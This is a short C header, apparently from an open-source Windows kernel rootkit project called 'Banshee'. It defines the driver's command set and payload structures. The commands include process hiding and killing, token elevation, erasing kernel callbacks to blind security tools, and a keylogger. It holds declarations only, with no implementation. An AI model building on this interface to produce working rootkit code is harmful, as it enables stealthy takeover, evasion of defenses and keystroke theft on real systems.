#pragma once

#define DRIVER_TAG 'ehsB'
#define BANSHEE_VERSION "v0.1.1\n"

enum COMMAND_TYPE
{
    NONE = 0,
    KILL_PROCESS = 1,
    PROTECT_PROCESS = 2,
    ELEVATE_TOKEN = 3,
    HIDE_PROCESS = 4,
    ENUM_CALLBACKS = 5,
    ERASE_CALLBACKS = 6,
    START_KEYLOGGER = 7,
    UNLOAD = 8
};

typedef struct _CALLBACK_DATA {
    UINT64 driverBase;
    UINT64 offset;
    WCHAR driverName[64];
} CALLBACK_DATA;

typedef struct _BANSHEE_PAYLOAD {
    COMMAND_TYPE cmdType;
    ULONG status;
    ULONG ulValue;
    BYTE byteValue;
    WCHAR wcharString[64];
    CALLBACK_DATA callbackData[32];
} BANSHEE_PAYLOAD;